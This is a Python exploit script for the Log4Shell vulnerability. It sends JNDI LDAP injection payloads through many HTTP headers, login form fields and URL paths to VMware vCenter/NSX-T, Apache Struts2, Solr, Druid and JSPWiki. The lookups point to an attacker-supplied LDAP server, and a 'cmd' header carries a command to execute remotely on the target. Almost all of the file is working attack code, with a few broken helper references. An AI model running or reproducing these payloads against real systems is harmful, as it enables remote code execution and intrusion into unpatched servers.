# -*- coding: utf-8 -*-
import sys
import requests

requests.packages.urllib3.disable_warnings()
vmwarepath = '/websso/SAML2/SLO/vsphere.local?SAMLRequest=p'
proxies = {
  "http": "http://127.0.0.1:8080",
  "https": "http://127.0.0.1:8080",
}

usage = """
    Usage: 
        python3 %s [options]
    Options:

        --file   URL             
        --ip_port   "127.0.0.1:138"       eg : python3 %s --url url_address --cmd quser --ip ip:port

""" % (sys.argv[0],sys.argv[0])
url_list=[]
def get_url(each):
    try:
        with open(txt,'r') as f:
            for each in f:
                each = each.replace('\n','')
                each =str(each.encode("utf-8"))
                url_list.append(each)
            f.close()
    except:
        print("读取URL失败！")


def vmware_log4j2(url,cmd,ip):
    n=-1
    headers = {
            "User-Agent": "${jndi:ldap://"+ip+"/Basic/TomcatEcho}",
            "Bearer": "${jndi:ldap://"+ip+"/Basic/TomcatEcho}",
            "Authentication": "${jndi:ldap://"+ip+"/Basic/TomcatEcho}",
            "X-Requested-With": "${jndi:ldap://"+ip+"/Basic/TomcatEcho}",
            "X-Requested-For": "${jndi:ldap://"+ip+"/Basic/TomcatEcho}",
            "X-Forwarded-For": "${jndi:ldap://"+ip+"/Basic/TomcatEcho}",
            "If-Modified-Since": "${jndi:ldap://"+ip+"/Basic/TomcatEcho}",
            "Content-Type": "application/x-www-form-urlencoded",
            "X-Forwarded-For": "${jndi:ldap://"+ip+"/Basic/TomcatEcho}",
            "X-Api-Version": "${jndi:ldap://"+ip+"/Basic/TomcatEcho}",
            "Referer": "${jndi:ldap://"+ip+"/Basic/TomcatEcho}",
            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
            "cmd":cmd
                }
    payloads=['vcenter','VMware NSX-T','strtus2-payload1','strtus2-payload2','strtus2-payload3','strtus2-payload4','Apache solr','Apache solr1','Apache Druid','Apache JSPWiki']
    data={'j_username': '${jndi:ldap://'+ip+'/Basic/TomcatEcho}', 'j_password': '123','submit-btn':' ','struts.token.name':'${jndi:ldap://'+ip+'/Basic/TomcatEcho}'}
    payload=['/websso/SAML2/SLO/vsphere.local?SAMLRequest=','/j_spring_security_check','/login.do','/static/1.js','/strtus/1.js','/struts2-showcase/'+'/struts2-showcase/${jndi:ldap:${::-/}/'+ip+'/abc}/','/solr/admin/cores?action=CREATE&name=${jndi:ldap://'+ip+'/abc}&wt=json','/solr/admin/info/system?_=${jndi:ldap://'+ip+'/exp}&wt=json','/druid/coordinator/v1/lookups/config/${jndi:ldap://'+ip+'/abc}','/JSPWiki/wiki/${jndi:ldap:${::-/}/'+ip+'/abc}/']
    for E in payload:
        r= requests.post(url+E,headers=headers,data=data,proxies=proxies,verify=False)
        n=n+1
        if r.status_code == 200 or r.status_code == 302:
            ming=payloads[n]
            print(ming+" 执行成功")
        elif r.status_code == 400:
            print("输入的参数有误！")
        else:
            print(payloads[n]+" 执行失败")
#def apache_log4j2()




#def nginx_log4j2

def main():
    if len(sys.argv) < 2:
        print(usage)
    elif len(sys.argv) == 3 and sys.argv[1] == "--file":
        file = str(sys.argv[2])
        POST_SCAN(file)
    elif len(sys.argv) == 7 and sys.argv[1] == "--url" and sys.argv[3] == "--cmd" and sys.argv[5] == "--ip":
        url = str(sys.argv[2])
        cmd = str(sys.argv[4])
        ip= str(sys.argv[6])
        vmware_log4j2(url,cmd,ip)

if __name__ == "__main__":
    main()
